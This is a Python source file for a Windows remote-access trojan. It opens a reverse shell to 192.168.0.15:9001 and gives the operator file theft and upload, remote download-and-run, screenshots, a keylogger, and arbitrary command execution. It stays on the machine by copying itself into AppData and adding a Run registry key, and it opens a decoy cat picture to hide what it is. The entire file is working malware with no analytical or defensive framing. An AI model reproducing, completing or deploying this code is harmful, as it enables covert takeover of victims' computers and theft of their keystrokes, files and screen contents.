#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
import threading
import keylogger
from mss import mss

def reliable_send(data):
    json_data = json.dumps(data.decode('windows-1252'))
    s.send(json_data.encode('windows-1252'))

def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + str(s.recv(1024).decode('windows-1252'))
            return json.loads(json_data)
        except ValueError:
            continue

def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
    except:
        admin="[!!] User privileges"
    else:
        admin="[+] Administrator privileges"

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def download(url):
    r = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(r.content)

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(("192.168.0.15", 9001))
            shell()
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == "q":
            try:
                t1.do_run = False
                t1.join()
                os.remove(keylogger_path)
            except:
                continue
            break
        elif command[:4] == "help":
            help_options = '''
download <path> -> Download a file from target PC
upload <path>   -> Upload a file to target PC
get <url>       -> Download file to target PC from any website
start <path>    -> Start program on target PC
screenshot      -> Take a screenshot of target monitor
check           -> Check for administrator privileges
keylog_start    -> Start keylogger on target PC
keylog_dump     -> Print out keystrokes captured by keylogger
q               -> Exit the reverse shell
'''
            reliable_send(help_options.encode('windows-1252'))
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                time.sleep(5)
                time.sleep(5)
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                result = reliable_recv()
                fin.write(base64.b64decode(result))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Downloaded file from specified URL!".encode('windows-1252'))
            except:
                reliable_send("[!!] Failed to download file".encode('windows-1252'))
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Program started!".encode('windows-1252'))
            except:
                reliable_send("[!!] Failed to start".encode('windows-1252'))
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                reliable_send("[!!] Failed to take screenshot!".encode('windows-1252'))
        elif command[:5] == "check":
            try:
                is_admin()
                reliable_send(admin.encode('windows-1252'))
            except:
                reliable_send("[!!] Can't perform privilege check")
        elif command[:12] == "keylog_start":
            t1 = threading.Thread(target=keylogger.start)
            t1.start()
        elif command[:11] == "keylog_dump":
            fn = open(keylogger_path, "r")
            reliable_send(fn.read().encode('windows-1252'))
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result)
            except:
                reliable_send("[!!] Can't execute that command".encode('windows-1252'))

def persistence():
    location = os.environ["appdata"] + "\\PySvc.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v PySvc /t REG_SZ /d "'+location+'"', shell=True)

        name = sys._MEIPASS + "\\Thinking-of-getting-a-cat.jpg"
        try:
            subprocess.Popen(name, shell=True)
        except:
            c = 0
            while c < 10:
                c += 1
keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
persistence()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
s.close()
